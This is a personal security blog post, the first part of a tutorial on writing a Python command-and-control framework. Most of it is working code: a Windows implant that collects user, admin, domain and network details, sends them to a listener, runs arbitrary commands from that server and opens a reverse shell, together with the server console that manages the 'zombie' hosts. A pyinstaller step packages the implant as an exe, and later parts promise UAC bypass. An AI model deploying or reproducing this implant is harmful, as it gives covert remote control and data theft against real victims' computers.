---
title:  "Create your own C2 using Python- Part 1"
header:
  teaser: "/assets/images/c2.png"
categories:
  - C2
  - Python
tags:
  - C2
  - Python
  - sockets
  - '2024'
  - metasploit
  - custom
  - DIY
  - command and control
---

Back in days of my adolescence, I was fascinated with all things Metasploit.  I was a ripe old teenager when Metasploit first came out, and I was enamored by it's inginuity and multifaceted offerings.  You could simply use it to get a shell, or exploit an unwitting victim using a known vulnerability.  Heck, you could (and still can) use it to generate shellcode, escalate privileges, pivot across the compromised network, loot passwords, and all contained within a simple, modest piece of software.  Why do I tell you all of this?

Because if it wasn't for Metasploit, I likely would have never became interested in Cybersecurity at all.  It was the pivotal moment in my life when everything started to click, at least in terms of my aspirations as certified IT geek.  I wanted a challenge, I wanted to understand windows internals more, learn C/C++, assembly,  privilege escalation.  Metasploit was the key to all of it.  Well, that leads us into the reason you're here reading this today.  I knew one day I'd want to learn how to develop my own C2 framework, and what an honor it is to present just that to you starting today! I get to teach you how to code something that was the very fabric of my beginnings in cybersecurity.  I'm thrilled to dive in and explore this with all of you.  Let's get started, cool?!  😸

> Now, first things first.  Don't expect this to be Havoc, Cobalt Strike, Slither, Brute Ratel, or any other number of excellent C2 frameworks out there today.  This will bear a crude resemblance to Metasploit at best and console / text based.  My aim is to teach you how to code a C2, not replace the already excellent ones out there today.  Okay, with that disclaimer behind us, let's go!

***The Implant/Zombie agent***
-

> The Imports and other important stuff

```python
import signal
import argparse
import socket
import subprocess
import sys
import threading
import os
import psutil
import time
from win32com.shell import shell
exit_event = threading.Event()
```

> reverse shell function

**Use the code I posted here and save it as pyrevshell_client.py:** 
**Be sure to edit the ip and port info!!!**

[https://g3tsyst3m.github.io/sockets/Create-your-own-Netcat-using-Python/](https://g3tsyst3m.github.io/sockets/Create-your-own-Netcat-using-Python/)

```python
def startrevshellcli():
    subprocess.call("C:/Users/public/pyrevshell_client.py")
    exit_event.set()
```

> Gather Victim/Zombie Operating System Info

```python
##################################
#Change this to whatever you like.  I'm using 127.0.0.1 because I'm port forwarding to virtualbox
##################################
host="127.0.0.1"
port=4545
breaktheloop=False #LOL, i don't remember what this is used for.  I coded this stuff a year ago... 😺

###################################
#This info below is fairly self-explanatory.  powershell is handy and quite efficient imho for retrieving host, os, and ip/adaptor info!
###################################

OnADomain="False"
LocalAdmin="False"
osinfo=subprocess.run("powershell.exe -command Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version | findstr Microsoft", capture_output=True, text=True)
osinfo=osinfo.stdout.strip()

try:
    ipaddrinfo=subprocess.run("powershell.exe -command (Get-NetIPAddress -AddressFamily IPv4).IpAddress | findstr /V 169. | findstr /V 127.0.0.1", capture_output=True, text=True)
    ipaddrinfo=ipaddrinfo.stdout.strip()
except:
    ipaddrinfo="No IP addresses active on system"
try:
    ######################
    #Are we on a domain?
    ######################
    domaininfo=subprocess.run("whoami /FQDN", capture_output=True, text=True)
    if "Unable" in domaininfo.stderr:
        OnADomain="False"
        print("[-] NOT domain joined")
    else:
        print("[+] domain joined!")
        OnADomain="True"
except:
    print("[!] unexpected error...")
gathering=subprocess.run("net user " + os.environ.get('USERNAME'), capture_output=True, text=True)

##################################
#Member of admins group?
##################################
if "Administrators" in gathering.stdout:
    print("[+] members of local admins!")
    LocalAdmin="True"

if OnADomain == "True":    
    info=os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "Domain Info: " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
else:
    info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo
```

***The Socket Connection to your Attacker Box / C2 listener***
-

```python
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port)) #Connect to our attacker box
client.send(info.encode('UTF-8')) # send the info collected and stored in the `info` variable in the code above this section
"""
This is the info we're sending to the C2 listener
 info=os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "Domain Info: " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
else:
    info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo
"""

#############################
#create a thread that is perpetual and receives commands from the listener on our attacker box.
#This thread target is our receiver function and we share the client socket as our argument
#############################
handler_thread = threading.Thread(target=receiver, args=(client, ))
handler_thread.daemon=True
handler_thread.start()

#Keep it alive!!!
while True:
    time.sleep(1)
```

***The "Receiving of Commands" Function***
-

Some of the info below may look confusing at first, but we will fill in the blanks.  The server / attacker box will be capable of sending the following commands at the moment:

- **msg**: Sends a basic message to the client
- **getuserinfo**: gets os, ip, iselevated, user info
- **whoami**: This tells us who the active user is for this shell.
- **shell**: Initiates a reverse shell!
- **command**: issues a curl command to get our victim's public IP
- **self-destruct**: kills the agent/zombie

```python
def receiver(client):

    while True:
        try:
            #this checks to see if the agent is still alive and receiving data
            data=client.recv(1024)
        except:
            print("server must have died...time to hop off")
            client.close()
            os._exit(0) 
        data=data.decode('UTF-8') #get the commands we're sending from the attacker box
        
        if ":msg:" in data:
            print(data)
        if ":whoami:" in data:
            whoami=os.getlogin()
            client.send(whoami.encode())
       
        if ":shell:" in data: #start the reverse shell!
            exit_event.clear()
            
            handler_thread2 = threading.Thread(target=startrevshellcli)
            handler_thread2.daemon = True
            handler_thread2.start()
            while not exit_event.is_set():
                time.sleep(1)
        if "c0mm@nd" in data: #does a curl ifconfig.me to get public ip
            command=data.split("\n")
            command=command[1]
            print("command: ", command)
            proc = subprocess.Popen(command,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
            client.send(b"returned output: \n"+proc.stdout.read())
            proc.stdin.close()
            proc.terminate()
            
        if "self-destruct" in data: #kill the agent!
            client.close()
            os._exit(0) 
```

Okay, so the `Client` was easy.  The `Server`, which is our main command and control center, is a bit more complex.  I'm running the server code on Linux btw.  Feel free to run it on Windows if you're so inclined.  it'll work but it's a bit buggy at the moment.  I've tried to include some checks to help make things cooperate nicely, where it's operating system agnostic. 😄

***The C2 Server!!!***
-

> The Imports and other important stuff

```python
import socket
import subprocess
import sys
import time
import threading
import asyncio
import io
import os
import psutil
import colorama
from colorama import Fore, Back, Style
exit_event = threading.Event()

counter=-1
clientlist=[]
clientdata=[]
automigrate="" #we'll use this at a later point in the series.  sort of a teaser variable if you will 😸
```

> The initial setup and listener

```python
host = "0.0.0.0"
port = 4545

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)
print(Fore.YELLOW + "[+] listening on port "+str(port), Fore.WHITE)

handler_thread = threading.Thread(target=init_main_sock)
handler_thread.daemon = True
handler_thread.start()

handler_thread = threading.Thread(target=server_selection)
handler_thread.daemon = True
handler_thread.start()

while True:
    time.sleep(1)
```

> Accept socket connections from the victim/client

```python
def init_main_sock():
    while True:
        conn, addr = s.accept()
        print(Fore.GREEN, f'\n[*] Accepted new connection from: {addr[0]}:{addr[1]} !!!', Fore.WHITE)
        # Get the client socket handle number, not really necessary but I like it
        client_sock_handle = conn.fileno()
        print(f"Client socket handle: {client_sock_handle}")
        global counter
        global automigrate #won't be using this just yet
        counter+=1 #increase the client connect global counter.  yeah I'm using globals, wanna fight about it?! 😆
        #print("gathering client info...")
        clientinfo = conn.recv(1024)
        clientinfo = clientinfo.decode('UTF-8')
        clientinfo=clientinfo.split("\n")
        ##########################################
        #we're storing each client that connects using a list!
        #it can't get any easier than that right?!
        ##########################################

        UserInfo=clientinfo[0]
        #print(clientinfo)
        clientlist.append([counter, conn, UserInfo])
        clientdata.append(clientinfo)
        
        handler_thread = threading.Thread(target=probe)
        handler_thread.daemon = True
        handler_thread.start()
```

***Select your Zombie! 🧟***
-

> In this section, we will setup our basic command prompt to help us navigate our zombie agents

```python
def server_selection():
    global clientlist
    commands="True"
    
    while not "exit" in commands:
        
        command=input(Fore.CYAN + "<< elev8 >> $ " + Fore.WHITE)
        if command=="":
            pass
        if command=="zombies": #interact with a zombie/agent!
            zombies()
        if command == "cls" or command == "clear": #clear the console if it gets cluttered, works on windows / linux
            if os.name == 'nt':
                os.system("cls")
            else:
                os.system("clear")
        if command == "?" or command == "help": #just tells you stuff you prob already know
            print(Fore.YELLOW + "commands:\n$ zombies\n$ clear/cls (clears screen)\n$ control + C kills server\n" + Fore.WHITE)
```

***Code for the reverse shell listener function***
-

> Code we need to have in place when we want to get a reverse shell using our zombie agent 🧟‍♂️

```python
def startrevshellsvr():
    if os.name == 'nt': #we usin' windows, well...then do this
        subprocess.call(["py", "pyrevshell_server.py"])
        exit_event.set()
    else: #else, we're flyin high like a penguin and usin' linux!  so, act accordingly
        subprocess.call(["python3", "pyrevshell_server.py"])
        exit_event.set()
```

***Keepalive probe to determine if zombies are (un)dead or alive***
-

> setup a probe 👽 to ensure agents are still alive or dead (hey mom there's something in the backroom.  Hope it's not the creature from above...)

```python
def probe():
    while True:
        global counter
        global clientlist
        global clientdata
       
        ############################################################
        # are any not alive anymore?  do a keep-alive probe to see...
        ############################################################
        try:
            d = 0
            for c in range(len(clientlist)):
                clientlist[c][1].send(b"?keepalive?\n")
                d = d + 1
        except:
            print(Fore.YELLOW + "\nThis Zombie died:\n************************\n" + Fore.WHITE, counter, "--> ", clientdata[d], "\n************************\n")
            clientlist.pop(d)
            clientdata.pop(d)
            counter = counter - 1
            print(Fore.GREEN + "[+] removed \"dead\" zombie ;) " + Fore.WHITE)
        time.sleep(4)
```

***Interact with your Zombies dude!!! 🧟‍♀️***
-

> This section is the biggest but most essential.  We interact with our zombies and issue commands to be executed on the victim machine!

I apologize for not going into detail on the code.  If you have questions, feel free to ask me.  I'm on twitter and discord, etc.  Happy to explain further.

```python
def zombies():
    global counter
    global clientlist
    global clientdata
    selection=""
    
    if (len(clientlist)) <= 0:
        print(Fore.RED + "[!] no zombies yet..." + Fore.WHITE)
        return
        
    print(Fore.GREEN + "Zombies: ", len(clientlist), Fore.WHITE)

    temp=0
    for b in clientdata:
        print("Zombie: ", temp, "-->", b)
        temp+=1
    print(Fore.GREEN + "\nPick a zombie to interact with!\n" + Fore.WHITE)
    try:
        selection=int(input(' <enter the client #> $ '))
    except:
        print(Fore.RED + "[!] enter client number..." + Fore.WHITE)
        time.sleep(2)
        return 
    
    while True:
        if os.name == 'nt':
            os.system("cls")
        else:
            os.system("clear")
        print(Fore.GREEN)
        print("what would you like to do?")
        print("1. Send a Message")
        print("2. Get user info")
        print("3. Get public ip")
        print("4. Kill Zombie")
        print("5. Start a Shell!")
        print("6. Whoami")
        """
        =============================================
        Preview of what's to come :)  get pumped!!!!
        =============================================
        print("7. GetSyst3m!!!")
        print("8. BypassUAC")
        print("9. Migrate Process")
        """
        print("15. Main menu")
        print(Fore.WHITE)
        try:
            choice=input(Fore.YELLOW + "[Select a number]: $ " + Fore.WHITE)
        except:    
            print(Fore.RED + "[!] enter a number..." + Fore.WHITE)
            time.sleep(2)
            return            
        if choice == "1":
            try:
                clientlist[selection][1].send(b":msg:\nhey from the server!\n")
                print(Fore.GREEN + "[+] Message Sent!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] there was an error sending the msg to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "2":
            for a in clientdata[selection]:
                print(a)
            input()
        if choice == "3":
            try:
                clientlist[selection][1].send(b"c0mm@nd\ncurl ifconfig.me\n")
                print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
                pubip=clientlist[selection][1].recv(1024)
                pubip = pubip.decode('UTF-8')
                print(pubip)
                input("press any key...")
            except:
                print(Fore.RED + "[!] there was an error sending the command to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "4":
            try:
                clientlist[selection][1].send(b"self-destruct\n")
                print(Fore.GREEN + "[+] zombie self-destruct succeeded!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] There was an issue communicating with the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "5":
            #starttheshell(clientlist[selection][1])
            #subprocess.call(["python", "testsocketserver.py"])
            exit_event.clear()
            
            handler_thread = threading.Thread(target=startrevshellsvr)
            handler_thread.daemon = True
            handler_thread.start()
            
            print("[+] starting shell in 2 seconds!")
            time.sleep(2)
            
            clientlist[selection][1].send(b":shell:\n")
            
            #handler_thread2 = threading.Thread(target=startrevshellcli)
            #handler_thread2.daemon = True
            #handler_thread2.start()
            while not exit_event.is_set():
                time.sleep(1)
            return
        if choice == "6":
            clientlist[selection][1].send(b":whoami:\n")
            whoami=clientlist[selection][1].recv(1024)
            whoami = whoami.decode('UTF-8')
            print("You are: ", whoami)
            time.sleep(2)

        if choice == "15":
            return
```

You may be thinking to yourself,"But...how can I get this to execute on a windows machine that isn't running python?"  It's a fair question!  I'm sure some folks will knock `pyinstaller`, but it does the job just fine.

> **pyinstaller --onefile --icon=icon.ico your_script.py**

Now you have an .exe that can be used without the need to have python installed.

***DEMO TIME!!! ⏲️***
-

![image](https://github.com/user-attachments/assets/25c9f790-3fd2-4acf-a973-776bda7996e7)

![image](https://github.com/user-attachments/assets/271bf841-b2ff-4b48-8190-b278a162d510)

![image](https://github.com/user-attachments/assets/7639c05e-2903-4ffb-8ea1-2a4bc0b7db6a)

![image](https://github.com/user-attachments/assets/adfd33fd-0874-4c42-91cb-c073709ab541)

![image](https://github.com/user-attachments/assets/987c1706-308e-4fe3-9564-aea4483e9090)

![image](https://github.com/user-attachments/assets/1abdb9a0-9ae9-4212-bb0c-2af8cddb5229)

![image](https://github.com/user-attachments/assets/d8892c73-b2b4-48af-a230-074d2fdcbe62)

![image](https://github.com/user-attachments/assets/6b774600-4d55-47e4-85b1-312ab7c541c4)

![image](https://github.com/user-attachments/assets/699c1fb6-c0da-4f68-8990-691eb24447b9)

Want the source code?  no problem!  here ya go!  Just go to the C2 folder:

[code for blog](https://github.com/g3tsyst3m/CodefromBlog)

Also I got tired of blurring my name.  Probably better most of you know it honestly.  I'm Robbie, nice to meet you 😄

Next time, we'll start incorporating more advanced features like migrating processes, bypassing UAC (maybe), and elevating to SYSTEM!  See you then!







